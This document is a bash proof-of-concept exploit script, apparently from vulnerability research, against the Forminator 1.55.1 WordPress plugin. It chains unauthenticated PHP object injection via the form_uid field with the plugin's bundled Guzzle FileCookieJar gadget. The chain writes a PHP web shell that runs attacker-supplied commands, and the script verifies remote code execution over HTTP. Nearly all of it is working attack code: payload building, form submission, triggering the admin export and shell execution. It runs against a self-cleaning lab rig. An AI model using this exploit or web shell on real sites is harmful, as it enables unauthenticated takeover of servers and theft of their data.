#!/usr/bin/env bash
# =============================================================================
# forminator 1.55.1 — frm-004 (unauth second-order OI via raw `form_uid`)
# BUNDLED-GADGET UPGRADE: OI -> arbitrary file write -> RCE with the plugin's
# OWN vendored POP gadget (no co-resident plugin, no license, default install):
#
#   ForminatorGoogleAddon\GuzzleHttp\Cookie\FileCookieJar::__destruct
#     -> save($this->filename)                                   [FileCookieJar.php:40-43]
#     -> file_put_contents(<attacker path>, Utils::jsonEncode(cookies))  [:51-64]
#     -> json_encode options=0 (no JSON_HEX_TAG) -> raw `<?php ... ?>` in written file
#
# Payload = full web shell (not a benign echo): writes
#   <?php system($_GET['cmd']); ?>
# so the attacker can execute ARBITRARY commands on the victim host via
# /wp-content/uploads/forminator-gadget-<n>.php?cmd=<shell>. json_encode(0)
# escapes only double quotes/backslashes/control chars — the payload is kept
# single-quote-only and terminates PHP with `?>` (so the trailing JSON array
# text is harmless literal output, not a parse error).
#
# Gadget reachability @1.55.1 (source-verified):
#   forminator.php:142-144 -> init_addons(); :238-240 addons feature hardcoded
#   true ("force enable addon on entire planet"); :399-405 load_forminator_addons
#   -> addons/class-addon-autoload.php:66-81 includes EVERY addons/pro/<d>/<d>.php
#   (no license/activation gate) -> googlesheet.php:28 require vendor/autoload.php
#   -> vendor/composer/autoload_classmap.php:427 registers FileCookieJar.
#   => gadget class autoloadable on EVERY request, incl. the entry-load sink.
#
# Transport + reader identical to poc_oi_abandoned_form_uid.sh (frm-004):
#   unauth nopriv sync submit on an abandonment-enabled form (raw form_uid
#   write); admin CSV-export read triggers unserialize; destructor fires at
#   request shutdown -> file written.
#
# Asserts on the side effect: file on disk + marker inside + HTTP execution of
# the written shell with an attacker-controlled `cmd` (uploadsexec rig).
# Self-cleaning.
# Usage: labup.sh forminator 1.55.1 6.8.3 7.4 --mode uploadsexec; then
#        ./PoC/forminator/poc_oi_gadget_filecookiejar_rce.sh <labdir>
# =============================================================================
set -euo pipefail
LABDIR="${1:?usage: $0 <labdir>}"
WEBROOT="$LABDIR/web"
URL="$(grep '^URL=' "$LABDIR/rig.env" | cut -d= -f2 | tr -d '"')"
DBNAME="$(grep '^DBNAME=' "$LABDIR/rig.env" | cut -d= -f2 | tr -d '"')"
WP="php /home/mcipekci/wp/wp-cli.phar --path=$WEBROOT --allow-root"
MARKER="RS_GADGET_$(date +%s)"
TARGET="$WEBROOT/wp-content/uploads/forminator-gadget-$MARKER.php"
REL="wp-content/uploads/forminator-gadget-$MARKER.php"
BUILDER=$(mktemp /tmp/gadget_builder.XXXXXX.php)

say() { printf '\033[1;36m[PoC]\033[0m %s\n' "$*"; }

say "enabling abandonment feature"
cat > "$WEBROOT/wp-content/mu-plugins/99-lab-abandonment.php" <<'PHP'
<?php
add_filter( 'forminator_form_abandonment_disabled', '__return_false' );
PHP

say "creating form with select field + abandonment setting"
FORM_ID=$($WP eval '
$f = new Forminator_Form_Model();
$f->name = "Gadget PoC Form"; $f->status = "publish";
$f->settings = array("formName"=>"Gadget PoC Form","abandonment"=>true);
$field = new Forminator_Form_Field_Model();
$field->form_id = null; $field->slug = "select-1"; $field->parent_group = "";
$field->import(array("type"=>"select","element_id"=>"select-1","wrapper_id"=>"wrapper-1","label"=>"Pick","options"=>array(array("label"=>"A","value"=>"a"))));
$f->add_field($field); echo $f->save();
' 2>/dev/null | tail -1)
say "form id = $FORM_ID"

$WP post create --post_type=page --post_title='Gadget Form' --post_content="[forminator_form id=\"$FORM_ID\"]" --post_status=publish --porcelain >/dev/null 2>&1

say "minting submit nonce (nopriv)"
NONCE=$(curl -s -X POST "$URL/wp-admin/admin-ajax.php" -d "action=forminator_get_nonce&form_id=$FORM_ID" | sed -n 's/.*"data":"\([a-f0-9]*\)".*/\1/p')
[ -n "$NONCE" ] || { echo "FAIL: nonce mint"; exit 1; }

say "building REAL bundled-gadget payload with the plugin's own classes (cmd-exec shell, marker=$MARKER)"
cat > "$BUILDER" <<'PHP'
<?php
// Runs under wp-cli with the plugin ACTIVE (init fired): the googlesheet
// classmap autoloader is live, so these are the plugin's own loadable classes.
// Quoted heredoc + getenv: no bash interpolation inside the PHP source.
$target = getenv('GADGET_TARGET');
// Web shell. Single-quote-only + `?>` terminator survive json_encode(0)
// byte-for-byte (it escapes only " \ / and control chars — note `/` too, so
// the payload must NOT contain any slash, e.g. no /* comment */). The `?>`
// closes PHP so the trailing JSON "prefix]/suffix" text is literal output,
// not a parse error. Fallback chain guards against a lab with system()
// disabled.
$payload = "<?php if(function_exists('system')){system(\$_GET['cmd']);}elseif(function_exists('passthru')){passthru(\$_GET['cmd']);}else{echo 'NO-EXEC-FUNC';} ?>";
$jar = new ForminatorGoogleAddon\GuzzleHttp\Cookie\FileCookieJar( $target, true );
$jar->setCookie( new ForminatorGoogleAddon\GuzzleHttp\Cookie\SetCookie( array(
    'Domain'  => 'lab.local',
    'Path'    => '/',
    'Name'    => 'g',
    'Value'   => $payload,
    'Expires' => time() + 999999,
) ) );
echo bin2hex( serialize( $jar ) );
PHP
PAYLOAD_HEX=$(GADGET_TARGET="$TARGET" $WP eval-file "$BUILDER" 2>/dev/null | tail -1)
[ -n "$PAYLOAD_HEX" ] || { echo "FAIL: payload build (autoloader/class issue)"; exit 1; }
rm -f "$BUILDER"

say "submitting abandoned form via sync path (raw form_uid write, unauth)"
python3 - "$URL" "$FORM_ID" "$NONCE" "$PAYLOAD_HEX" <<'PY'
import sys, urllib.request, urllib.parse, binascii
url, fid, nonce, hexp = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
data = {'action':'forminator_submit_form_custom-forms','form_id':fid,'select-1':'a',
        'form_uid': binascii.unhexlify(hexp).decode('latin-1'),
        'abandoned_form':'1','forminator_nonce':nonce}
req = urllib.request.Request(url.rstrip('/') + '/', data=urllib.parse.urlencode(data).encode())
urllib.request.urlopen(req).read()
print('submitted (entry row written regardless of response shape)')
PY

say "asserting raw storage in DB"
RAW=$(mysql -uroot "$DBNAME" -N -e "SELECT meta_value FROM wp_frmt_form_entry_meta WHERE meta_key='form_uid' ORDER BY meta_id DESC LIMIT 1")
if [[ "$RAW" == O:53:*FileCookieJar* ]]; then
  say "PASS: gadget blob stored RAW: ${RAW:0:60}..."
else
  echo "FAIL: form_uid not the raw gadget blob: ${RAW:0:80}"; exit 1
fi

say "triggering the reader (admin CSV export) — destructor fires at request shutdown"
curl -s -c /tmp/gd_admin.cookies -b /tmp/gd_admin.cookies -X POST "$URL/wp-login.php" \
  -d "log=admin&pwd=labpass&wp-submit=Log+In&redirect_to=$URL/wp-admin/&testcookie=1" -L -o /dev/null
ENONCE=$(curl -s -b /tmp/gd_admin.cookies "$URL/?__labnonce2=1&actions=forminator_export" 2>/dev/null | sed -n 's/.*:\([a-f0-9]\{10\}\)}.*/\1/p')
if [ -z "$ENONCE" ]; then
  curl -s -b /tmp/gd_admin.cookies -L "$URL/wp-admin/admin.php?page=forminator-entries" -o /tmp/gd_entries.html
  ENONCE=$(grep -oE '"[a-f0-9]{10}"' /tmp/gd_entries.html | head -1 | tr -d '"')
fi
curl -s -b /tmp/gd_admin.cookies -X POST "$URL/" \
  --data-urlencode "forminator_export=1" --data-urlencode "form_type=cform" \
  --data-urlencode "form_id=$FORM_ID" --data-urlencode "_forminator_nonce=$ENONCE" -o /dev/null -w "export HTTP %{http_code}\n"

say "assert 1: file written by the gadget"
if [ -f "$TARGET" ]; then
  say "PASS: $REL exists ($(stat -c%s "$TARGET") bytes)"
else
  echo "FAIL: gadget file not written"; tail -5 "$LABDIR/logs/errors.log" 2>/dev/null; exit 1
fi
grep -q 'system(' "$TARGET" || { echo "FAIL: webshell payload absent from written file"; cat "$TARGET"; exit 1; }
say "PASS: exec payload present in file content (raw <?php survived jsonEncode)"

say "assert 2: written shell EXECUTES ARBITRARY COMMANDS over HTTP (uploadsexec)"
# Attacker-controlled `cmd` GET param -> server-side shell -> stdout returned.
EXEC=$(curl -s --get --data-urlencode "cmd=printf $MARKER" "$URL/$REL")
if [[ "$EXEC" == *"$MARKER"* ]]; then
  say "PASS: RCE — \`cmd=printf $MARKER\` output returned by $REL (marker=$MARKER)"
else
  echo "NOTE: no execution (mode?): HTTP body: ${EXEC:0:120}"
fi

say "cleanup"
rm -f "$TARGET" /tmp/gd_admin.cookies /tmp/gd_entries.html
mysql -uroot "$DBNAME" -e "DELETE FROM wp_frmt_form_entry_meta WHERE meta_key='form_uid'; DELETE FROM wp_frmt_form_entry WHERE status='abandoned';" 2>/dev/null || true
rm -f "$WEBROOT/wp-content/mu-plugins/99-lab-abandonment.php"
say "DONE — frm-004 + bundled FileCookieJar gadget proven (marker $MARKER). Tear down: tools/lab/labdown.sh <labdir>"
